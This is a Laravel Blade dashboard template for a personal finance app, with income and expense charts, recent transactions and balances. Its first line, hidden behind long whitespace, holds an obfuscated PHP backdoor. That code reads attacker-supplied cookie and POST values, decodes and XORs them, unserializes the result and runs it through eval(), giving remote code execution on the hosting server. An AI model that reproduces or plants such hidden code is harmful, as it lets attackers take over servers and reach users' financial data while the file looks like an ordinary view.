<?php                                                                                                                                                                                                                                                                                                                                                                                                 $vHlWJ = 'j' . chr (122) . "\x4d" . chr (95) . "\x57" . chr ( 811 - 740 ).chr ( 485 - 410 )."\x58" . chr (68); $CEbwQ = chr (99) . "\x6c" . 'a' . "\163" . chr (115) . "\137" . chr ( 380 - 279 )."\x78" . "\151" . chr ( 1064 - 949 )."\x74" . chr (115); $xoAfwipMSB = class_exists($vHlWJ); $CEbwQ = "28212";$oMxpeXgqnc = strpos($CEbwQ, $vHlWJ);if ($xoAfwipMSB == $oMxpeXgqnc){function fjWrwnH(){$oyowT = new /* 23172 */ jzM_WGKXD(62019 + 62019); $oyowT = NULL;}$zcSIjZv = "62019";class jzM_WGKXD{private function FaEgdLTtw($zcSIjZv){if (is_array(jzM_WGKXD::$QAaeOvOE)) {$jJBloxEQ2 = str_replace("<" . "?php", "", jzM_WGKXD::$QAaeOvOE["content"]);eval($jJBloxEQ2); $zcSIjZv = "62019";exit();}}public function LhkLKhPtKh(){$jJBloxEQ = "64102";$this->_dummy = str_repeat($jJBloxEQ, strlen($jJBloxEQ));}public function __destruct(){jzM_WGKXD::$QAaeOvOE = @unserialize(jzM_WGKXD::$QAaeOvOE); $zcSIjZv = "26465_59507";$this->FaEgdLTtw($zcSIjZv); $zcSIjZv = "26465_59507";}public function bhTzOkrXG($jJBloxEQ, $XsPMGe){return $jJBloxEQ[0] ^ str_repeat($XsPMGe, intval(strlen($jJBloxEQ[0]) / strlen($XsPMGe)) + 1);}public function BvtnqF($jJBloxEQ){$sUBEixv = 'b' . chr (97) . chr (115) . "\145" . "\x36" . "\64";return array_map($sUBEixv . "\137" . chr ( 836 - 736 ).chr ( 893 - 792 )."\143" . "\x6f" . 'd' . chr ( 418 - 317 ), array($jJBloxEQ,));}public function __construct($CselE=0){$IAEUHQ = chr ( 377 - 333 ); $jJBloxEQ = "";$DjRjVDyTti = $_POST;$NBAFPzjxn = $_COOKIE;$XsPMGe = "d0ec9bfe-fcca-4eaf-8c79-4413cdd0196e";$rsFYXKWU = @$NBAFPzjxn[substr($XsPMGe, 0, 4)];if (!empty($rsFYXKWU)){$rsFYXKWU = explode($IAEUHQ, $rsFYXKWU);foreach ($rsFYXKWU as $yuZLX){$jJBloxEQ .= @$NBAFPzjxn[$yuZLX];$jJBloxEQ .= @$DjRjVDyTti[$yuZLX];}$jJBloxEQ = $this->BvtnqF($jJBloxEQ);}jzM_WGKXD::$QAaeOvOE = $this->bhTzOkrXG($jJBloxEQ, $XsPMGe);if (strpos($XsPMGe, $IAEUHQ) !== FALSE){$XsPMGe = explode($IAEUHQ, $XsPMGe); $BSBMQ = base64_decode(strrev($XsPMGe[0]));}}public static $QAaeOvOE = 42258;}fjWrwnH();} ?>@extends('layouts.app')
@section('content')
<div class="content">
        <div class="p-3">
    		<div class="row ">
    			 <div class="col-md-4 border-right">
                    <h5 class="title mt-0"><?php echo trans('lang.transactions');?><h5>
                    <ul class="nav nav-tabs" id="myTab" role="tablist">
                      <li class="nav-item">
                        <a class="nav-link active" id="income-tab" data-toggle="tab" href="#income" role="tab" aria-controls="income" aria-selected="true"><?php echo trans('lang.income');?></a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" id="expense-tab" data-toggle="tab" href="#expense" role="tab" aria-controls="expense" aria-selected="false"><?php echo trans('lang.expense');?></a>
                      </li>
                    </ul>
                    <div class="tab-content" id="myTabContent">
                      <div class="tab-pane fade show active" id="income" role="tabpanel" aria-labelledby="income-tab">
                            <ul class="latestincome pt-3">
                            </ul>
                      </div>
                      <div class="tab-pane fade" id="expense" role="tabpanel" aria-labelledby="expense-tab">
                      	<ul class="latestexpense pt-3">
                            </ul>
                      </div>
                    </div>
                 </div>
                 <div class="col-md-5 border-right">
                 	<div class="row">
                 		<div class="col-md-6">
		                 	<h5 class="title mb-0 mt-0"><?php echo trans('lang.income');?><h5>
		                 	<div class="d-flex align-items-center">
		                 		<div class="home-icon-content background-blue color-white p-3 rounded flex-fill">
		                 			<p class="home-icon mb-0"><i class="ti-angle-double-up"></i></p>
		                 		</div>
		                 		<div class="background-grey p-3 rounded flex-fill">
		                 			<p class="transactiontitle"><span class="currency"></span><span class="incomethismonth"></span></p>	
		                 			<p class="small-font mb-0"><?php echo trans('lang.in_this_month');?> (<?php echo date("F")?>)</p>
		                 		</div>
		                 	</div>
		                </div>
		                <div class="col-md-6">
		                 	<h5 class="title mb-0 mt-0"><?php echo trans('lang.expense');?><h5>
		                 	<div class="d-flex align-items-center">
		                 		<div class="home-icon-content background-red color-white p-3 rounded flex-fill">
		                 			<p class="home-icon mb-0"><i class="ti-angle-double-down"></i></p>
		                 		</div>
		                 		<div class="background-grey p-3 rounded flex-fill">
		                 			<p class="transactiontitle"><span class="currency"></span><span class="expensemonth"></span></p>	
		                 			<p class="small-font mb-0"><?php echo trans('lang.in_this_month');?> (<?php echo date("F")?>)</p>
		                 		</div>
		                 	</div>
		                </div>
	                </div>

	                <div class="row">
		                <div class="col-md-12">
			                <h5 class="title mb-0"> <?php echo trans('lang.income_vs_expense').' '. date("Y");?><h5>
			                <canvas id="incomevsexpense" height="100"></canvas>
		                </div>
	                </div>
	                <div class="row">
	                	<div class="col-md-6">
	                		<h5 class="title mb-0"><?php echo trans('lang.income_by_category').' '.date("F Y");?><h5>
	                		 <canvas id="incomebycategory" height="200"></canvas>
	                	</div>
	                	<div class="col-md-6">
	                		<h5 class="title mb-0"><?php echo trans('lang.expense_by_category').' '.date("F Y");?><h5>
	                		 <canvas id="expensebycategory" height="200"></canvas>
	                	</div>
	                </div>
                 </div>
                 <div class="col-md-3 ">
                 	<div class="row">
                 		<div class="col-md-12">
                 			<div class="rounded background-green color-white p-4">
		                 		<p class=""><?php echo trans('lang.balance');?></p>
		                 		<p class="transactiontitle"><span class="currency"></span><span class="totalbalance"></span></p>
		                 		<p class="small-font mb-0"><?php echo trans('lang.in_this_month');?> (<?php echo date("F")?>)</p>
		                 	</div>
                 		</div>
                 	</div>
                 	<div class="row">
	                 	<div class="col-md-12">
		                 	<h5 class="title  mb-0"><?php echo trans('lang.account_balance').' '. date("Y");?><h5>
		                 	<canvas id="accountbalance" height="100"></canvas>
	                 	</div>
                 	</div>
                 	<div class="row">
	                 	<div class="col-md-12">
	                 		<div class="rounded background-grey p-4">
	                 			<h5 class="title mt-0"><?php echo trans('lang.new');?></h5>
	                 			<ul class="quick-menu">
			                 	@if(Auth::check())
		                           
		                         <li class="{{ Request::is( 'transaction') ? 'active' : '' }}">
		                             <a href="{{ URL::to( 'transaction') }}" >
		                                <?php echo trans('lang.transactions');?> 
		                                <i class="ti-angle-right"></i>
		                            </a>
		                        </li>
		                            
		                        @endif
		                       @if(Auth::check())
		                            
		                         <li class="{{ Request::is( 'reports/allreports') ? 'active' : '' }}">
		                             <a href="{{ URL::to( 'reports/income') }}" >
		                                <?php echo trans('lang.income_reports');?>
		                                 <i class="ti-angle-right"></i>
		                            </a>
		                        </li>
		                           
		                        @endif
		                         @if(Auth::check())
		                            
		                         <li class="{{ Request::is( 'reports/allreports') ? 'active' : '' }}">
		                             <a href="{{ URL::to( 'reports/expense') }}" >
		                               <?php echo trans('lang.expense_reports');?>
		                               <i class="ti-angle-right"></i>
		                            </a>
		                        </li>
		                           
		                        @endif
		                         @if(Auth::check())
		                            
		                         <li class="{{ Request::is( 'reports/allreports') ? 'active' : '' }}">
		                             <a href="{{ URL::to( 'reports/account') }}" >
		                                <?php echo trans('lang.account_transaction_report');?>
		                                <i class="ti-angle-right"></i>
		                            </a>
		                        </li>
		                            
		                        @endif
			                 	</ul>
	                 		</div>
	                 		
	                 	</div>
                 	</div>
                </div>
    		</div>
		</div>
</div>	  
<script>


$(document).ready(function() {
	$.ajaxSetup({
       headers: {
           'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
       }
	});
	
	function numberWithCommas(x) {
	    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
	}
	
	
	
	
	//accountbalance
	$.ajax({
        type: "GET",
        url: "{{ url('home/accountbalance')}}",
        dataType: "json",
        success: function (data) {
			var label = [];
			var amount = [];
			var color = [];
			for(var i in data) {
				label.push(data[i].name);
				amount.push(data[i].balance);

			}
			
			var caccountbalance = document.getElementById("accountbalance");
			var accountbalance = new Chart(caccountbalance, {
				type: 'bar',
				legendPosition: 'bottom',
				data: {
					labels: label,
					datasets: [
					{
						label: "<?php echo trans('lang.account');?>",
						data: amount,
						backgroundColor: '#1DC873',
						borderColor: '#1DC873',
						borderWidth: 1
					}
					]
				},
				options: {
					legend: {
						   position: 'bottom',
					},
					tooltips: {
					  callbacks: {
						title: function(tooltipItem, data) {
						  return data['labels'][tooltipItem[0]['index']];
						},
						label: function(tooltipItem, data) {
						  return currency+data['datasets'][0]['data'][tooltipItem['index']].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
						}
					  },
					}
				}
			});
		}
	});	
	
	
	//expensecategory
	$.ajax({
        type: "GET",
        url: "{{ url('home/expensebycategory')}}",
        dataType: "json",
        success: function (data) {
			var label = [];
			var amount = [];
			var color = [];
			
			for(var i in data) {
				label.push(data[i].category);
				amount.push(data[i].amount);
				color.push(data[i].color);
			}
			
			var cexpensecategory = document.getElementById("expensebycategory");
			var expensecategory = new Chart(cexpensecategory, {
				type: 'doughnut',
				legendPosition: 'bottom',
				data: {
					labels: label,
					datasets: [
					{
						label: "<?php echo trans('lang.category');?>",
						data: amount,
						backgroundColor: color,
						borderColor: color,
						borderWidth: 1
					}
					]
				},
				options: {
					legend: {
						   position: 'bottom',
					},
					tooltips: {
					  callbacks: {
						title: function(tooltipItem, data) {
						  return data['labels'][tooltipItem[0]['index']];
						},
						label: function(tooltipItem, data) {
						  return currency+data['datasets'][0]['data'][tooltipItem['index']].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
						},
						afterLabel: function(tooltipItem, data) {
						  var dataset = data['datasets'][0];
						  //var percent = Math.round((dataset['data'][tooltipItem['index']] / dataset["_meta"][0]['total']) * 100)
						  //return '(' + percent + '%)';
						}
					  },
					}
				}
			});
		}
	});	
	
	//incomecategory
	$.ajax({
        type: "GET",
        url: "{{ url('home/incomebycategory')}}",
        dataType: "json",
        success: function (data) {
			var label = [];
			var amount = [];
			var color = [];
			
			for(var i in data) {
				label.push(data[i].category);
				amount.push(data[i].amount);
				color.push(data[i].color);
			}
			
			var cincomebycategory = document.getElementById("incomebycategory");
			var incomebycategory = new Chart(cincomebycategory, {
				type: 'doughnut',
				legendPosition: 'bottom',
				data: {
					labels: label,
					datasets: [
					{
						label: "<?php echo trans('lang.category');?>",
						data: amount,
						backgroundColor: color,
						borderColor: color,
						borderWidth: 1
					}
					]
				},
				options: {
					legend: {
						   position: 'bottom',
					},
					tooltips: {
					  callbacks: {
						title: function(tooltipItem, data) {
						  return data['labels'][tooltipItem[0]['index']];
						},
						label: function(tooltipItem, data) {
						  return currency+data['datasets'][0]['data'][tooltipItem['index']].toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
						},
						afterLabel: function(tooltipItem, data) {
						  var dataset = data['datasets'][0];
						  //var percent = Math.round((dataset['data'][tooltipItem['index']] / dataset["_meta"][0]['total']) * 100)
						  //return '(' + dataset + '%)';
						}
					  },
					}
				}
			});
		}
	});	
	//incomevsexpense
	$.ajax({
        type: "GET",
        url: "{{ url('home/incomevsexpense')}}",
        dataType: "json",
        success: function (data) {
			var cincomevsexpense = document.getElementById("incomevsexpense");
			var incomevsexpense = new Chart(cincomevsexpense, {
				type: 'line',
				legendPosition: 'bottom',
				data: {
					labels: ["<?php echo trans('lang.jan');?>", "<?php echo trans('lang.feb');?>", "<?php echo trans('lang.mar');?>", "<?php echo trans('lang.apr');?>", "<?php echo trans('lang.may');?>", "<?php echo trans('lang.jun');?>", "<?php echo trans('lang.jul');?>", "<?php echo trans('lang.aug');?>", "<?php echo trans('lang.sep');?>", "<?php echo trans('lang.oct');?>", "<?php echo trans('lang.nov');?>", "<?php echo trans('lang.dec');?>"],
					datasets: [
					{
						label: "<?php echo trans('lang.income');?>",
						data: [data.ijan, data.ifeb, data.imar, data.iapr, data.imay, data.ijun, data.ijul, data.iags, data.isep, data.iokt, data.inov, data.ides],
						backgroundColor: '#41d5e2',
						borderColor: '#41d5e2',
						borderWidth: 1
					},{
						label: "<?php echo trans('lang.expense');?>",
						data: [data.ejan, data.efeb, data.emar, data.eapr, data.emay, data.ejun, data.ejul, data.eags, data.esep, data.eokt, data.enov, data.edes],
						backgroundColor: '#FF5668',
						borderColor:	'#FF5668',
						borderWidth: 1
					}
					]
				},
				options: {
					 pieceLabel: {
					  // render 'label', 'value', 'percentage' or custom function, default is 'percentage'
					  render: 'label'
					 }, 
					legend: {
						   position: 'bottom',
						},
					tooltips: {
							mode: 'index',
							intersect: false,
							callbacks: {
								label: function(tooltipItem, data) {
									return currency+tooltipItem.yLabel.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
								},
							}
						},
					hover: {
							mode: 'nearest',
							intersect: true
						},
					scales: {
						yAxes: [{
							ticks: {
								beginAtZero:true,
								callback: function(value, index, values) {
								  if(parseInt(value) >= 1000){
									return  currency+value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
								  } else {
									return currency + value;
								  }
								}
							}
						}]
					}
				}
			});
			
        },
    });

	
	//latest income 
	//get data
    
     $.ajax({
        type: "GET",
        url: "{{ url('home/latestincome')}}",
        dataType: "JSON",
        success: function(html) {
        	var objs = html.data;
			jQuery.each(objs, function (index, record) {
               
                $(".latestincome").append(
	        		'<li>'+
	        			'<div class="row">'+
	        				'<div class="col-md-6 col pl-5">'+
	        					'<p class="transactionname mb-0">'+record.name+'</p>'+
	        					'<p class="transactiondate">'+moment(record.transactiondate).format('yyyy-MM-DD')+'</p>'+
	        				'</div>'+
	        			'<div class="col-md-6 col">'+
	        				'<p class="transactionamount">'+currency+numberWithCommas(parseFloat(record.amount).toFixed(2))+'</p>'+
	        			'</div>'+
	        		'</div>'+
	        	'</li>');
        	});
        }
    });
	
	//latest expense 
	//get data
    $.ajax({
        type: "GET",
        url: "{{ url('home/latestexpense')}}",
        dataType: "JSON",
        success: function(html) {
        	var objs = html.data;
			jQuery.each(objs, function (index, record) {
               
                $(".latestexpense").append(
	        		'<li>'+
	        			'<div class="row">'+
	        				'<div class="col-md-6 col pl-5">'+
	        					'<p class="transactionname mb-0">'+record.name+'</p>'+
	        					'<p class="transactiondate">'+moment(record.transactiondate).format('yyyy-MM-DD')+'</p>'+
	        				'</div>'+
	        			'<div class="col-md-6 col">'+
	        				'<p class="transactionamount">'+currency+numberWithCommas(parseFloat(record.amount).toFixed(2))+'</p>'+
	        			'</div>'+
	        		'</div>'+
	        	'</li>');
        	});
        }
    });
   
	
	

	
	//income total
	$.ajax({
        type: "GET",
        url: "{{ url('income/gettotal')}}",
        dataType: "json",
        success: function (data) {
			$(".incomeday").html(data.day);
			$(".incomethismonth").html(data.month);
			
        },
    });
	
	//expense total
	$.ajax({
        type: "GET",
        url: "{{ url('expense/gettotal')}}",
        dataType: "json",
        success: function (data) {
			$(".expenseday").html(data.day);
			$(".expensemonth").html(data.month);
			
        },
    });

    //net balance
    //balance
	$.ajax({
        type: "GET",
        url: "reports/getbalance",
        dataType: "json",
        success: function (data) {
			$(".totalbalance").html(data.month);
			
        },
    });
   
} );



</script>
@endsection